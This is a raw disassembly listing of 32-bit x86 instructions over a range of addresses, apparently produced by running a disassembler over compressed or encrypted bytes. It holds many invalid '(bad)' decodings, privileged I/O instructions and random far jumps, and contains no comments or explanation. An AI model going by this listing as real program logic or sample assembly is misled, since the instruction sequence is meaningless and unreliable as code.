  41f121:	dec    DWORD PTR [edx-0x4eba226e]
  41f127:	jb     0x41f173
  41f129:	push   ss
  41f12a:	xor    eax,0xfd3b29bf
  41f12f:	mov    cl,0x31
  41f131:	bound  esi,QWORD PTR [eax]
  41f133:	repz fs cdq 
  41f136:	xchg   ebx,eax
  41f137:	and    cl,BYTE PTR [esi-0x3f]
  41f13a:	push   es
  41f13b:	cmp    DWORD PTR [edi-0x5898b1a4],edi
  41f141:	dec    eax
  41f142:	test   BYTE PTR [edx+0x46f0b3c6],bh
  41f148:	mov    edi,0xe7e0c863
  41f14d:	xchg   BYTE PTR [edx],cl
  41f14f:	lods   eax,DWORD PTR ds:[esi]
  41f150:	ins    BYTE PTR es:[edi],dx
  41f151:	pop    ebx
  41f152:	or     edx,DWORD PTR [edx]
  41f154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f155:	out    dx,eax
  41f156:	jne    0x41f181
  41f158:	vhaddps xmm1,xmm6,XMMWORD PTR [esi+0x51768bf9]
  41f160:	out    0xd2,eax
  41f162:	cmovg  esp,DWORD PTR [ebp+0x31da3a27]
  41f169:	bound  ecx,QWORD PTR [esp+edx*8]
  41f16c:	stos   BYTE PTR es:[edi],al
  41f16d:	jmp    0x98a9:0xc3b6b9e3
  41f174:	and    ah,BYTE PTR [esi+0x6]
  41f177:	iret   
  41f178:	inc    edx
  41f179:	adc    DWORD PTR [ecx+0x36b9eef9],0xffffffd6
  41f180:	push   es
  41f181:	or     dl,bl
  41f183:	aaa    
  41f184:	loopne 0x41f1ea
  41f186:	imul   esi,DWORD PTR [ebx+eax*4],0x78
  41f18a:	mov    dh,0xcb
  41f18c:	xchg   esi,eax
  41f18d:	test   eax,0x7632ce9b
  41f192:	xor    BYTE PTR [esi+0x4dd67050],dl
  41f198:	aas    
  41f199:	std    
  41f19a:	retf   0x724b
  41f19d:	jg     0x41f13d
  41f19f:	sbb    DWORD PTR [esi],esi
  41f1a1:	jnp    0x41f14c
  41f1a3:	mov    ebx,0x91e23d3b
  41f1a8:	frstor [eax]
  41f1aa:	ins    BYTE PTR es:[edi],dx
  41f1ab:	xor    ch,BYTE PTR [edi-0x2029f13d]
  41f1b1:	pop    ss
  41f1b2:	mov    ah,0xfd
  41f1b4:	jae    0x41f1ea
  41f1b6:	lahf   
  41f1b7:	data16 (bad) 
  41f1b9:	jle    0x41f22f
  41f1bb:	fmul   QWORD PTR [ebx-0x5]
  41f1be:	mov    bl,0x77
  41f1c0:	jg     0x41f145
  41f1c2:	push   eax
  41f1c3:	ins    BYTE PTR es:[edi],dx
  41f1c4:	ins    DWORD PTR es:[edi],dx
  41f1c5:	xchg   ebx,eax
  41f1c6:	scas   al,BYTE PTR es:[edi]
  41f1c7:	pop    ds
  41f1c8:	push   esi
  41f1c9:	cmc    
  41f1ca:	cmp    al,0x35
  41f1cc:	add    al,0xbe
  41f1ce:	inc    edi
  41f1cf:	sub    dl,BYTE PTR [ecx]
  41f1d1:	(bad)  
  41f1d2:	out    dx,eax
  41f1d3:	adc    ah,BYTE PTR [ecx+0x4748d02e]
  41f1d9:	jae    0x41f20c
  41f1db:	jg     0x41f1b7
  41f1dd:	push   ebx
  41f1de:	lahf   
  41f1df:	push   edi
  41f1e0:	push   ds
  41f1e1:	push   ebp
  41f1e2:	test   BYTE PTR ds:0x725c1ce,0xed
  41f1e9:	add    BYTE PTR [eax+0x4207e39a],0x12
  41f1f0:	stc    
  41f1f1:	pop    ebp
  41f1f2:	outs   dx,DWORD PTR ds:[esi]
  41f1f3:	cmp    eax,0x3d1d2ef6
  41f1f8:	sub    al,0xa8
  41f1fa:	aaa    
  41f1fb:	xchg   esp,eax
  41f1fc:	test   DWORD PTR [ebp+eax*4-0xf],0xd4c8cede
  41f204:	mov    ecx,0x6c7ca30f
  41f209:	add    dh,bh
  41f20b:	aad    0xdf
  41f20d:	xlat   BYTE PTR ds:[ebx]
  41f20e:	outs   dx,BYTE PTR ds:[esi]
  41f20f:	retf   
  41f210:	popf   
  41f211:	ja     0x41f240
  41f213:	jno    0x41f1ce
  41f215:	mov    esi,0x98eb9472
  41f21a:	jbe    0x41f1e1
  41f21c:	loope  0x41f1e7
  41f21e:	loopne 0x41f27c
  41f220:	sbb    cl,BYTE PTR [ecx+0x7453930]
  41f226:	sub    bh,al
  41f228:	inc    esp
  41f229:	mov    WORD PTR [edx-0x7af08870],es
  41f22f:	and    al,0xd3
  41f231:	shl    ecx,1
  41f233:	imul   eax,DWORD PTR [eax],0x60be6159
  41f239:	mov    edx,0x11a7b332
  41f23e:	(bad)  
  41f240:	test   eax,0xcb2ab6d5
	...
  41f251:	xor    dl,al
  41f253:	and    ecx,ebp
  41f255:	repz jmp 0x41f250
  41f258:	fcmovnb st,st(3)
  41f25a:	pop    ebp
  41f25b:	sbb    DWORD PTR [ecx+0x67],ebx
  41f25e:	or     ebp,DWORD PTR [ebp+0x16d2d13]
  41f264:	add    BYTE PTR [ebx+eax*1+0x38cb0000],ch
  41f26b:	bound  esp,QWORD PTR ds:0xd9f21cff
  41f271:	sub    ecx,esp
  41f273:	imul   ecx,esp,0xf73348ff
  41f279:	jne    0x41f253
  41f27b:	mov    ds:0x38789712,eax
  41f280:	js     0x41f2fb
  41f282:	add    BYTE PTR [ebx+0x28],ah
  41f285:	inc    esi
  41f286:	mov    eax,ds:0xd815a465
  41f28b:	push   0x25
  41f28d:	fadd   st,st(2)
  41f28f:	mov    ds:0x3b8622bb,eax
  41f294:	rol    DWORD PTR [esi-0x18b3c00f],0xd4
  41f29b:	popa   
  41f29c:	jecxz  0x41f250
  41f29e:	stos   DWORD PTR es:[edi],eax
  41f29f:	xchg   esi,eax
  41f2a0:	jle    0x41f2e0
  41f2a2:	shl    BYTE PTR [ebp+0x4e39a95f],cl
  41f2a8:	jl     0x41f2c2
  41f2aa:	sbb    eax,0xce3cd4b7
  41f2af:	(bad)  
  41f2b0:	mov    DWORD PTR [edx+0x5a],ebp
  41f2b3:	fwait
  41f2b4:	into   
  41f2b5:	cmp    bh,BYTE PTR [ebx+0xc]
  41f2b8:	xchg   ebp,eax
  41f2b9:	sub    DWORD PTR [edx+edx*8-0x43],0xf3426e5d
  41f2c1:	mov    cl,0x25
  41f2c3:	xchg   ecx,eax
  41f2c4:	dec    ebx
  41f2c5:	xchg   edx,eax
  41f2c6:	inc    ebx
  41f2c7:	leave  
  41f2c8:	ja     0x41f300
  41f2ca:	inc    ecx
  41f2cb:	or     eax,0xa9b2b861
  41f2d0:	sbb    ch,bh
  41f2d2:	add    al,0x67
  41f2d4:	jmp    0x609dcd79
  41f2d9:	outs   dx,DWORD PTR ds:[esi]
  41f2da:	sbb    eax,edi
  41f2dc:	mov    dl,0x89
  41f2de:	retf   
  41f2df:	(bad)  [edx-0x45]
  41f2e2:	fisubr DWORD PTR [ebp+0x770887e4]
  41f2e8:	push   esp
  41f2e9:	fild   WORD PTR [edx]
  41f2eb:	retf   
  41f2ec:	(bad)  
  41f2ed:	jmp    0x39cc24d4
  41f2f2:	push   eax
  41f2f3:	dec    ebp
  41f2f4:	(bad)  
  41f2f5:	retf   0x8435
  41f2f8:	mov    al,ds:0x418c596f
  41f2fd:	sub    al,0xf2
  41f2ff:	xor    eax,DWORD PTR [edi+0x991383a]
  41f305:	mov    esi,0xfc7b74ab
  41f30a:	rcr    DWORD PTR [edx],0x0
  41f30d:	stos   DWORD PTR es:[edi],eax
  41f30e:	pop    ebp
  41f30f:	mov    ds:0xd1e7f3ce,al
  41f314:	xlat   BYTE PTR ds:[ebx]
  41f315:	sahf   
  41f316:	cmp    BYTE PTR [esi],ah
  41f318:	test   DWORD PTR [edx-0x40],ebp
  41f31b:	imul   ebx,DWORD PTR [edi-0x3f569338],0xba4d1f82
  41f325:	sbb    BYTE PTR [edx],ah
  41f327:	data16 (bad) 
  41f329:	imul   edx,DWORD PTR [ebx+0x56],0x217534b6
  41f330:	mov    ebx,0xa558f0ba
  41f335:	lods   al,BYTE PTR ds:[esi]
  41f336:	and    eax,0x8214fcc
  41f33b:	std    
  41f33c:	cwde   
  41f33d:	pop    esp
  41f33e:	jnp    0x41f2e1
  41f340:	mov    cl,0x9d
  41f342:	push   esi
  41f343:	int    0x61
  41f345:	pop    ecx
  41f346:	jnp    0x41f2db
  41f348:	add    eax,0xbeef91
  41f34d:	cli    
  41f34e:	ret    0x3604
  41f351:	inc    esi
  41f352:	std    
  41f353:	xchg   ecx,eax
  41f354:	and    al,BYTE PTR [edi+0x528015e2]
  41f35a:	call   0x80936544
  41f35f:	pop    eax
  41f360:	mov    edi,0xdeecebcc
  41f365:	mov    ecx,0x92318b75
  41f36a:	inc    eax
  41f36b:	pop    ds
  41f36c:	fistp  WORD PTR [edx-0x2a4682b5]
  41f372:	xchg   esp,eax
  41f373:	outs   dx,BYTE PTR ds:[esi]
  41f374:	jge    0x41f3a7
  41f376:	icebp  
  41f377:	push   eax
  41f378:	pop    es
  41f379:	cwde   
  41f37a:	sbb    bl,al
  41f37c:	xor    eax,0x9b09289a
  41f381:	outs   dx,BYTE PTR ds:[esi]
  41f382:	adc    ebp,DWORD PTR [esi+0x15]
  41f385:	mov    WORD PTR [ebx+0x11],?
  41f388:	sub    DWORD PTR [ebp-0x6c31f3c0],ebx
  41f38e:	fnstenv [bx]
  41f391:	(bad)
  41f394:	ins    BYTE PTR es:[edi],dx
  41f395:	and    ecx,ebx
  41f397:	pop    edx
  41f398:	sub    BYTE PTR [eax+0x46943e45],bl
  41f39e:	pop    edi
  41f39f:	and    DWORD PTR [ebp-0x15],eax
  41f3a2:	sti    
  41f3a3:	into   
  41f3a4:	push   cs
  41f3a5:	iret   
  41f3a6:	pop    ecx
  41f3a7:	mov    dl,0x95
  41f3a9:	or     eax,0x1930ffdf
  41f3ae:	pusha  
  41f3af:	add    eax,edx
  41f3b1:	popa   
  41f3b2:	inc    esp
  41f3b3:	shl    BYTE PTR [edi+ebp*4-0x5cf12bbb],1
  41f3ba:	push   esp
  41f3bb:	adc    al,0x44
  41f3bd:	push   ebx
  41f3be:	mov    eax,0x36f0fca4
  41f3c3:	and    eax,0x50310666
  41f3c8:	jae    0x41f353
  41f3ca:	mov    ecx,ecx
  41f3cc:	stos   BYTE PTR es:[edi],al
  41f3cd:	or     esi,eax
  41f3cf:	repnz mov eax,ds:0x4c4d9756
  41f3d5:	je     0x41f37e
  41f3d7:	jbe    0x41f37f
  41f3d9:	stos   DWORD PTR es:[edi],eax
  41f3da:	inc    esp
  41f3db:	add    DWORD PTR [esp+esi*8],ecx
  41f3de:	retf   0x1c8
  41f3e1:	test   DWORD PTR [ecx],edx
  41f3e3:	int3   
  41f3e4:	fstp   QWORD PTR [edi]
  41f3e6:	pop    ebp
  41f3e7:	add    ecx,DWORD PTR [ecx+0x4f4b8215]
  41f3ed:	inc    ebp
  41f3ee:	xor    DWORD PTR [esi+0x54],esi
  41f3f1:	ret    
  41f3f2:	imul   eax,DWORD PTR [edi],0x7
  41f3f5:	scas   al,BYTE PTR es:[edi]
  41f3f6:	mul    DWORD PTR [ebx+0x54]
  41f3f9:	xor    al,0x1d
  41f3fb:	jle    0x41f3ac
  41f3fd:	fistp  WORD PTR [eax]
  41f3ff:	and    cl,bl
  41f401:	aad    0x45
  41f403:	inc    ecx
  41f404:	imul   esi,DWORD PTR [esp+ebp*2+0x5c64308],0xe5a61d19
  41f40f:	inc    eax
  41f410:	shl    BYTE PTR [ebp-0x8780c37],0x5a
  41f417:	daa    
  41f418:	jbe    0x41f490
  41f41a:	mov    DWORD PTR [ebp-0x28],esi
  41f41d:	loope  0x41f402
  41f41f:	mov    es,WORD PTR [esi]
  41f421:	test   eax,0x8dde6dfa
  41f426:	xchg   edi,eax
  41f427:	pop    edi
  41f428:	idiv   DWORD PTR [edi]
  41f42a:	ret    
  41f42b:	mov    esp,edi
  41f42d:	test   al,0xd5
  41f42f:	cmp    al,0x5d
  41f431:	push   es
  41f432:	mov    al,BYTE PTR [ecx+0x2e]
  41f435:	push   0xffffffcc
  41f437:	mov    al,0x27
  41f439:	sbb    BYTE PTR ds:0x98c445cf,ch
  41f43f:	and    ebp,DWORD PTR [edi-0x3afc8a20]
  41f445:	xor    eax,0xde383241
  41f44a:	sbb    al,0xab
  41f44c:	mov    ecx,DWORD PTR [ecx-0x7e]
  41f44f:	or     ecx,esp
  41f451:	rcl    BYTE PTR fs:[esi-0x2a],0xd6
  41f456:	(bad)  
  41f457:	pop    ebp
  41f458:	sub    eax,0xbdc8b16
  41f45d:	mov    gs,WORD PTR [eax+0x7b]
  41f460:	inc    ebx
  41f461:	aaa    
  41f462:	push   ecx
  41f463:	into   
  41f464:	or     al,0x81
  41f466:	mov    edi,DWORD PTR [edi]
  41f468:	enter  0xcf18,0x8a
  41f46c:	xchg   esi,eax
  41f46d:	ret    0x1a98
  41f470:	inc    esi
  41f471:	pop    edx
  41f472:	enter  0x12d5,0xd5
  41f476:	push   cs
  41f477:	bnd ret 0x964d
  41f47b:	in     al,0x14
  41f47d:	mov    dh,dl
  41f47f:	mov    WORD PTR [edx+0x6b],gs
  41f482:	imul   eax,DWORD PTR [edi],0xf92a6ac6
  41f488:	jbe    0x41f453
  41f48a:	(bad)  
  41f48b:	push   ecx
  41f48c:	sbb    edi,DWORD PTR [edx-0x14b0444b]
  41f492:	pop    ebx
  41f493:	in     al,0x21
  41f495:	adc    eax,DWORD PTR [edx]
  41f497:	jge    0x41f499
  41f499:	mov    ecx,0x95d9dd57
  41f49e:	pusha  
  41f49f:	and    BYTE PTR ds:0x9557bf76,cl
  41f4a5:	pop    ds
  41f4a6:	int3   
  41f4a7:	xchg   esi,eax
  41f4a8:	test   BYTE PTR [eax-0x30],cl
  41f4ab:	push   edx
  41f4ac:	push   ebx
  41f4ad:	cmp    edx,DWORD PTR [ebx-0x25]
  41f4b0:	jge    0x41f49e
  41f4b2:	pop    DWORD PTR [ecx+eax*2]
  41f4b5:	(bad)  
  41f4b6:	sar    BYTE PTR [ebx+ebx*1-0x2b318a76],1
  41f4bd:	sub    eax,0x1969b3f
  41f4c2:	ds clc 
  41f4c4:	mov    edx,0x8f36e45a
  41f4c9:	sar    DWORD PTR [ebp+0x37d90226],1
  41f4cf:	scas   al,BYTE PTR es:[edi]
  41f4d0:	dec    esi
  41f4d1:	xor    BYTE PTR [ebp+0x3f],bl
  41f4d4:	ss cld 
  41f4d6:	jnp    0x41f460
  41f4d8:	mov    edi,0x3e28584c
  41f4dd:	rcl    esp,1
  41f4df:	jge    0x41f529
  41f4e1:	or     BYTE PTR [eax-0x11c49210],ah
  41f4e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4e8:	int    0x3d
  41f4ea:	outs   dx,BYTE PTR ds:[esi]
  41f4eb:	cmp    edi,eax
  41f4ed:	shr    DWORD PTR [edi],0x1a
  41f4f0:	pop    ebp
  41f4f1:	pop    ecx
  41f4f2:	(bad)  
  41f4f4:	jl     0x41f4c4
  41f4f6:	pop    esi
  41f4f7:	mov    BYTE PTR [ecx+ebx*2+0x4d],ch
  41f4fb:	sub    BYTE PTR [edx-0x5dd49b0c],dl
  41f501:	pop    edi
  41f502:	popa   
  41f503:	add    al,0x50
  41f505:	push   ebp
  41f506:	pop    es
  41f507:	ret    
  41f508:	cdq    
  41f509:	jmp    0x3e95ff9
  41f50e:	pop    es
  41f50f:	(bad)  
  41f510:	fsubp  st(4),st
  41f512:	popf   
  41f513:	ret    0x1d3e
  41f516:	mov    cl,BYTE PTR [edx]
  41f518:	cli    
  41f519:	cmp    al,0xfb
  41f51b:	and    edi,esi
  41f51d:	push   0xffffff9c
  41f51f:	cwde   
  41f520:	jmp    0x41f57a
  41f522:	or     al,0x54
  41f524:	mov    bl,0x1a
  41f526:	inc    edi
  41f527:	imul   ebp,DWORD PTR [edi],0xffffff8e
  41f52a:	jecxz  0x41f4ed
  41f52c:	jne    0x41f4f1
  41f52e:	aaa    
  41f52f:	out    0x20,eax
  41f531:	mov    al,0x42
  41f533:	jg     0x41f574
  41f535:	push   ds
  41f536:	mov    WORD PTR [esi+0x18],gs
  41f539:	xchg   edx,eax
  41f53a:	scas   al,BYTE PTR es:[edi]
  41f53b:	add    BYTE PTR [ebp-0x50],cl
  41f53e:	shl    BYTE PTR [esi+0x31],cl
  41f541:	cmc    
  41f542:	xchg   ebp,eax
  41f543:	inc    eax
  41f544:	cs and al,0xb6
  41f548:	loopne 0x41f4f7
  41f54a:	adc    al,0x8a
  41f54c:	mov    ds:0x92096de5,al
  41f551:	es or  eax,0xf9a1fbde
  41f557:	(bad)  
  41f558:	scas   al,BYTE PTR es:[edi]
  41f559:	jp     0x41f4e2
  41f55b:	xlat   BYTE PTR ds:[ebx]
  41f55c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f55d:	sub    edx,DWORD PTR [ecx]
  41f55f:	das    
  41f560:	mov    WORD PTR [ecx-0x13ce362b],gs
  41f566:	retf   
  41f567:	sbb    dl,bl
  41f569:	daa    
  41f56a:	pcmpgtd mm7,QWORD PTR ds:0x91c7666f
  41f571:	mov    bh,0x6a
  41f573:	pop    ds
  41f574:	mov    ds:0xcf3e8e97,al
  41f579:	mov    al,ds:0xe59c3790
  41f57e:	imul   ebx,esi,0xffffffea
  41f581:	dec    ebp
  41f582:	mov    dh,0x14
  41f584:	retf   
  41f585:	jmp    0xd1c1:0xfe6c61bb
  41f58c:	pop    edx
  41f58d:	loope  0x41f59f
  41f58f:	ret    0xe7ca
  41f592:	int3   
  41f593:	jae    0x41f5d9
  41f595:	dec    ebp
  41f596:	mov    ebp,0x491fb8b5
  41f59b:	sti    
  41f59c:	add    al,0xe8
  41f59e:	cwde   
  41f59f:	fisub  DWORD PTR [ebx+0x73]
  41f5a2:	imul   ebx,DWORD PTR [ebx+0x5a],0x36
  41f5a6:	mov    cl,0x12
  41f5a8:	jne    0x41f597
  41f5aa:	and    al,0xe2
  41f5ac:	and    ecx,eax
  41f5ae:	loope  0x41f5cf
  41f5b0:	out    dx,al
  41f5b1:	and    DWORD PTR [edi+0x28],esp
  41f5b4:	hlt    
  41f5b5:	(bad)  
  41f5b7:	outs   dx,BYTE PTR ds:[esi]
  41f5b8:	cmp    BYTE PTR [eax],0x6c
  41f5bb:	mov    cl,0x49
  41f5bd:	fdivr  st(0),st
  41f5bf:	jmp    0x85c0:0x6c85d4ba
  41f5c6:	pop    ecx
  41f5c7:	aas    
  41f5c8:	pop    edi
  41f5c9:	mov    ds:0x1c56c73b,eax
  41f5ce:	pusha  
  41f5cf:	inc    esp
  41f5d0:	mov    cl,0xf7
  41f5d2:	mov    edx,0x56e3d20b
  41f5d7:	daa    
  41f5d8:	mov    ?,WORD PTR [ebp-0x14]
  41f5db:	ja     0x41f5d2
  41f5dd:	ret    
  41f5de:	mov    dh,0xe7
  41f5e0:	scas   al,BYTE PTR es:[edi]
  41f5e1:	pop    esp
  41f5e2:	xchg   edi,eax
  41f5e3:	push   edx
  41f5e4:	imul   ebp,DWORD PTR [ebp+0x6e36dc32],0x103936c6
  41f5ee:	js     0x41f5a6
  41f5f0:	push   edi
  41f5f1:	add    al,0x80
  41f5f3:	jbe    0x41f65a
  41f5f5:	and    cl,BYTE PTR [edx]
  41f5f7:	call   0x1503d831
  41f5fc:	cs xor dl,bl
  41f5ff:	inc    ebx
  41f600:	or     ebx,DWORD PTR [esi+0x7e49a0d7]
  41f606:	push   edx
  41f607:	fst    QWORD PTR [esi+0x61]
  41f60a:	push   ss
  41f60b:	sub    edi,esi
  41f60d:	pop    ecx
  41f60e:	and    eax,0x61bd91b1
  41f613:	outs   dx,DWORD PTR ds:[esi]
  41f614:	test   BYTE PTR [eax],al
	...
  41f61e:	add    BYTE PTR [eax],al
  41f620:	add    BYTE PTR [edx+0x5],al
  41f623:	and    BYTE PTR [eax+0x67],ah
  41f626:	gs inc edx
  41f628:	daa    
  41f629:	sti    
  41f62a:	mov    ch,0xb1
  41f62c:	push   edx
  41f62d:	xor    al,bl
  41f62f:	out    0x30,al
  41f631:	fnstenv [eax+0x1]
  41f634:	add    BYTE PTR [ebx+eax*1-0x57e90000],ch
  41f63b:	test   eax,0xced3d55f
  41f640:	dec    edi
  41f641:	mov    DWORD PTR [ebx+ebp*4+0x74],0x162b3872
  41f649:	sahf   
  41f64a:	rcr    DWORD PTR [esi+ebx*1],cl
  41f64d:	push   ebx
  41f64e:	cmp    al,0x78
  41f650:	xchg   edx,eax
  41f651:	out    dx,al
  41f652:	lahf   
  41f653:	sub    BYTE PTR [edi+edi*1-0x3bd8d0cf],bh
  41f65a:	dec    ecx
  41f65b:	fwait
  41f65c:	sbb    dh,cl
  41f65e:	jb     0x41f5f4
  41f660:	or     BYTE PTR [ecx-0x24],bh
  41f663:	lahf   
  41f664:	xor    al,0xef
  41f666:	xchg   edx,eax
  41f667:	push   ds
  41f668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f669:	loop   0x41f603
  41f66b:	pop    ecx
  41f66c:	(bad)  
  41f66d:	jecxz  0x41f67e
  41f66f:	pushf  
  41f670:	loope  0x41f637
  41f672:	js     0x41f6de
  41f674:	sbb    BYTE PTR [eax],dl
  41f676:	sub    ebx,esi
  41f678:	push   ss
  41f679:	jo     0x41f628
  41f67b:	xchg   esp,eax
  41f67c:	dec    edx
  41f67d:	cs out 0xa0,eax
  41f680:	xchg   BYTE PTR [ebx],dh
  41f682:	push   eax
  41f683:	(bad)  
  41f684:	loopne 0x41f6a2
  41f686:	jno    0x41f630
  41f688:	mov    edx,0x6e6d70dc
  41f68d:	mov    eax,0x2dab5bd2
  41f692:	fcmovnu st,st(4)
  41f694:	and    edx,DWORD PTR [ebx+0x4c]
  41f697:	and    eax,0x799e9c50
  41f69c:	imul   edx,DWORD PTR [ebp+0x4c8cf090],0xffffff8b
  41f6a3:	stos   DWORD PTR es:[edi],eax
  41f6a4:	leave  
  41f6a5:	adc    DWORD PTR [edi+0x2a],ecx
  41f6a8:	loope  0x41f6b4
  41f6aa:	mov    cl,0x4a
  41f6ac:	mov    BYTE PTR [ecx*2-0x562d1416],dh
  41f6b3:	mov    cl,0xe1
  41f6b5:	repz sbb DWORD PTR [edi],esp
  41f6b8:	or     DWORD PTR [ebx],ecx
  41f6ba:	and    eax,0x56
  41f6bd:	or     ch,dh
  41f6bf:	sub    al,0xad
  41f6c1:	sub    ah,BYTE PTR [esi]
  41f6c3:	xchg   ebp,eax
  41f6c4:	xchg   DWORD PTR [edi],esi
  41f6c6:	lock xchg esi,eax
  41f6c8:	ss clc 
  41f6ca:	js     0x41f6d3
  41f6cc:	fiadd  WORD PTR [ebx+ebx*4-0x75]
  41f6d0:	inc    DWORD PTR [ebp+0x63]
  41f6d3:	dec    ebx
  41f6d4:	mov    DWORD PTR [ebx],edi
  41f6d6:	add    DWORD PTR [ecx-0x29c3db9e],ecx
  41f6dc:	stc    
  41f6dd:	pushf  
  41f6de:	sub    DWORD PTR [eax+eiz*8+0x1957235c],edx
  41f6e5:	xchg   ecx,eax
  41f6e6:	push   0x54d4c829
  41f6eb:	push   0x1d
  41f6ed:	inc    eax
  41f6ee:	or     al,0xd6
  41f6f0:	out    0x55,al
  41f6f2:	repz ror BYTE PTR [ecx],0x3d
  41f6f6:	ja     0x41f75a
  41f6f8:	and    ebx,DWORD PTR [ecx*1-0x36e2f914]
  41f6ff:	pop    esp
  41f700:	int    0xb7
  41f702:	push   edi
  41f703:	xor    eax,0xcc70ab1
  41f708:	fidiv  DWORD PTR [edx]
  41f70a:	imul   esp,DWORD PTR [ecx+0x64],0xffffffd2
  41f70e:	fdiv   QWORD PTR [ebx+ebp*8]
  41f711:	jecxz  0x41f709
  41f713:	ss gs std 
  41f716:	test   al,0x5f
  41f718:	mov    al,ds:0xd67b5798
  41f71d:	imul   ecx,ecx,0x65fd234c
  41f723:	call   0x3e0c9181
  41f728:	scas   eax,DWORD PTR es:[edi]
  41f729:	aad    0xbf
  41f72b:	mov    bl,0xe6
  41f72d:	push   ds
  41f72e:	scas   al,BYTE PTR es:[edi]
  41f72f:	mov    BYTE PTR [esi],cl
  41f731:	adc    al,BYTE PTR ds:0xdbc177eb
  41f737:	mov    al,0xf2
  41f739:	test   DWORD PTR [ebx+0x7ba9316c],0x5d499d90
  41f743:	mov    al,ds:0x5c344c44
  41f748:	fiadd  WORD PTR es:[esi-0x3318d1e5]
  41f74f:	jecxz  0x41f768
  41f751:	jo     0x41f7ac
  41f753:	push   ds
  41f754:	or     DWORD PTR [esi],eax
  41f756:	add    DWORD PTR [ebx+0x2c04bf37],ecx
  41f75c:	dec    ebx
  41f75d:	repz popa 
  41f75f:	shr    DWORD PTR [ecx],0xd5
  41f762:	mov    BYTE PTR [eax-0x2c],cl
  41f765:	dec    ebp
  41f766:	inc    ecx
  41f767:	xor    BYTE PTR [edi+ebx*8+0x999965f],al
  41f76e:	fidiv  WORD PTR [ebp-0x5e]
  41f771:	cld    
  41f772:	push   eax
  41f773:	cld    
  41f774:	lds    esp,FWORD PTR [edx-0x5f49b0d1]
  41f77a:	out    dx,al
  41f77b:	inc    eax
  41f77c:	mov    eax,ds:0x32920372
  41f781:	and    bh,ch
  41f783:	sub    esp,edi
  41f785:	out    0x91,eax
  41f787:	mov    ?,ebp
  41f789:	int    0x3b
  41f78b:	jne    0x41f7d8
  41f78d:	les    esi,FWORD PTR [ebx+0x6b]
  41f790:	xlat   BYTE PTR ds:[ebx]
  41f791:	xchg   edx,eax
  41f792:	or     al,0xc8
  41f794:	pop    edx
  41f795:	aaa    
  41f796:	icebp  
  41f797:	jb     0x41f73b
  41f799:	inc    ebx
  41f79a:	psllw  mm5,QWORD PTR [esi-0x23]
  41f79e:	push   0xffffffda
  41f7a0:	add    ah,BYTE PTR [edi-0x1f3b4fe0]
  41f7a6:	jl     0x41f80a
  41f7a8:	jo     0x41f761
  41f7aa:	fs mov bl,0xc9
  41f7ad:	dec    esp
  41f7ae:	push   ss
  41f7af:	lds    ecx,FWORD PTR [edx-0x10744a66]
  41f7b5:	test   dh,0xab
  41f7b8:	or     bl,BYTE PTR [esi]
  41f7ba:	push   ds
  41f7bb:	adc    DWORD PTR [edi-0x200a2cf8],ebp
  41f7c1:	sub    eax,0x78a92356
  41f7c6:	out    0xfb,al
  41f7c8:	sub    al,0x3
  41f7ca:	xchg   DWORD PTR [ebx-0x51],esi
  41f7cd:	cmp    bh,BYTE PTR [eax+0x60cc4707]
  41f7d3:	test   ebp,0x7f0c8af6
  41f7d9:	xor    al,0xb2
  41f7db:	outs   dx,BYTE PTR ds:[esi]
  41f7dc:	enter  0xd8cb,0x1f
  41f7e0:	cmp    esi,edi
  41f7e2:	push   ss
  41f7e3:	mov    bl,0xfa
  41f7e5:	gs sbb eax,0x54879204
  41f7eb:	cmp    BYTE PTR [edx-0x44],bl
  41f7ee:	sbb    DWORD PTR [esi-0x69],0x833eef0b
  41f7f5:	or     ecx,DWORD PTR [esi+0x6eafd0b5]
  41f7fb:	push   edx
  41f7fc:	outs   dx,DWORD PTR ds:[esi]
  41f7fd:	call   0x568d:0x5c33f7f
  41f804:	fwait
  41f805:	sbb    eax,0xdf415598
  41f80a:	or     BYTE PTR [ebx],cl
  41f80c:	leave  
  41f80d:	add    ah,ah
  41f80f:	bound  ebp,QWORD PTR [edx]
  41f811:	adc    al,0xc8
  41f813:	adc    BYTE PTR [edi-0x5],dl
  41f816:	mov    al,ds:0xb82c2696
  41f81b:	jbe    0x41f82d
  41f81d:	pop    esi
  41f81e:	push   ecx
  41f81f:	adc    eax,DWORD PTR [eax+0x660e416]
  41f825:	push   esi
  41f826:	pusha  
  41f827:	ret    
  41f828:	inc    DWORD PTR [ebp+0x1ad4583d]
  41f82e:	rcr    BYTE PTR [edx],0x4
  41f831:	mov    ds:0xda2838ee,eax
  41f836:	or     BYTE PTR [esp+edi*8+0x2],ch
  41f83a:	jle    0x41f7be
  41f83c:	fs cmp bl,dl
  41f83f:	pop    es
  41f840:	mov    al,0x7b
  41f842:	pusha  
  41f843:	push   es
  41f844:	lahf   
  41f845:	cmp    al,0xd6
  41f847:	or     dl,BYTE PTR [ecx]
  41f849:	or     cl,BYTE PTR [ebp-0x7415247b]
  41f84f:	rcr    BYTE PTR [ecx+edi*8],cl
  41f852:	ret    0x183
  41f855:	xchg   ebp,eax
  41f856:	sbb    eax,0xb8e15426
  41f85b:	sbb    esp,edi
  41f85d:	add    al,0x89
  41f85f:	xchg   esp,eax
  41f860:	std    
  41f861:	jno    0x41f8b4
  41f863:	lea    edi,[ebp-0x6a]
  41f866:	xchg   dl,al
  41f868:	add    esp,DWORD PTR [edi+0x30]
  41f86b:	dec    esp
  41f86c:	sub    al,0xfa
  41f86e:	adc    BYTE PTR [edx+0x1c472e8b],bh
  41f874:	sub    cl,BYTE PTR [edx]
  41f876:	clc    
  41f877:	pusha  
  41f878:	daa    
  41f879:	fadd   DWORD PTR [ecx+edx*4]
  41f87c:	test   al,0xef
  41f87e:	out    0x2a,eax
  41f880:	je     0x41f8a3
  41f882:	aam    0x3f
  41f884:	inc    ecx
  41f885:	xacquire xchg BYTE PTR [edx+0x2651cd8e],dh
  41f88c:	sbb    eax,0x66d16154
  41f891:	jns    0x41f8e2
  41f893:	shl    BYTE PTR [edx+edx*1-0x7c],cl
  41f897:	icebp  
  41f898:	ds cwde 
  41f89a:	mov    bl,0xd6
  41f89c:	jae    0x41f862
  41f89e:	cmp    esp,DWORD PTR [edi-0x75]
  41f8a1:	mov    ah,0x6e
  41f8a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8a4:	js     0x41f869
  41f8a6:	pop    ebx
  41f8a7:	test   eax,0x80998c77
  41f8ac:	mov    dh,0x35
  41f8ae:	inc    ecx
